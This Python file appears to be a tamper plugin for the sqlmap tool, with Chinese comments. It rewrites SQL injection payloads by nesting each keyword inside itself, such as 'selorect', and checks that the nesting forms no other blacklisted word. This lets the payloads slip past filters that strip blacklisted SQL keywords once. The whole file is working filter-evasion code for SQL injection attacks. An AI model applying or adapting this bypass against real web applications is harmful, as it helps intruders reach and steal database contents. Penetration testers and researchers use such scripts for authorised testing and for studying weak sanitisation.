#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""
import re

from lib.core.common import singleTimeWarnMessage
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL


def tamper(payload, **kwargs):
    """
    优化的双写绕过，顺序插入并判断是否新组成过滤单词
    比如SELECT，当插入位置为3时为SELSELECTECT，则会生成黑名单列表中另一个单词ELSE造成误判
    在此进行相关判断以保证生成的字符不存在另一个敏感词。

    主要应对：
        blacklist = [...]
        for n in blacklist:
            regex = re.compile(n, re.IGNORECASE)
            username = regex.sub("", username)

    >>> tamper('select 1 or 2 ORDER')
    'selorect 1 oorr 2 OorRDER'
    """

    #keywords = ["ABORT", "ACTION", "ADD", "AFTER", "ALL", "ALTER", "ALWAYS", "ANALYZE", "AND", "AS", "IN", "ASC", "ATTACH", "AUTOINCREMENT", "BEFORE", "BEGIN", "BETWEEN", "CASCADE", "CASE", "CAST", "CHECK", "COLLATE", "COLUMN", "COMMIT", "CONFLICT", "CONSTRAINT", "CREATE", "CROSS", "CURRENT", "CURRENT_DATE", "CURRENT_TIME", "CURRENT_TIMESTAMP", "DATABASE", "DEFAULT", "DEFERRABLE", "DEFERRED", "DELETE", "DESC", "DETACH", "DISTINCT", "DO", "DROP", "EACH", "ELSE", "END", "ESCAPE", "EXCEPT", "EXCLUDE", "EXCLUSIVE", "EXISTS", "EXPLAIN", "FAIL", "FILTER", "FIRST", "FOLLOWING", "FOR", "FOREIGN", "FROM", "FULL", "GENERATED", "GLOB", "GROUP", "GROUPS", "HAVING", "IF", "IGNORE", "IMMEDIATE", "INDEX", "INDEXED", "INITIALLY", "INNER","INSERT", "INSTEAD", "INTERSECT", "INTO", "IS", "ISNULL", "JOIN", "KEY", "LAST", "LEFT", "LIKE", "LIMIT", "MATCH", "MATERIALIZED", "NATURAL", "NO", "NOT", "NOTHING", "NOTNULL", "NULL", "NULLS", "OF", "OFFSET", "ON", "OR", "ORDER", "OTHERS", "OUTER", "OVER", "PARTITION", "PLAN", "PRAGMA", "PRECEDING", "PRIMARY", "QUERY", "RAISE", "RANGE", "RECURSIVE", "REFERENCES", "REGEXP", "REINDEX", "RELEASE", "RENAME", "REPLACE", "RESTRICT", "RETURNING", "RIGHT", "ROLLBACK", "ROW", "ROWS", "SAVEPOINT", "SELECT", "SET", "TABLE", "TEMP", "TEMPORARY", "THEN", "TIES", "TO", "TRANSACTION", "TRIGGER", "UNBOUNDED", "UNION", "UNIQUE", "UPDATE", "USING", "VACUUM", "VALUES", "VIEW", "VIRTUAL", "WHEN", "WHERE", "WINDOW", "WITH", "WITHOUT"]
    keywords=["UNION", "SELECT", "WHERE", "AND", "OR",
                "union", "select", "where", "and", "or"]
    retVal = payload

    warnMsg = "当前关键字列表如下，请注意修改:\n"
    warnMsg += "%s" % keywords
    singleTimeWarnMessage(warnMsg)

    if payload:
        for key in reversed(keywords):
            index = keywords.index(key)
            num = 1
            check = True
            while check:
                if num >= len(key):
                    singleTimeWarnMessage('无法绕过双写关键字列表')
                    exit()
                check = False
                repStr = "%s%s%s" % (key[:num], key, key[num:])
                for t in keywords[:index]:
                    if re.search(t, repStr) and not re.search(t, key):
                        check = True
                        break
                num += 1
            retVal = re.sub(key, repStr, retVal, flags=re.I)
    return retVal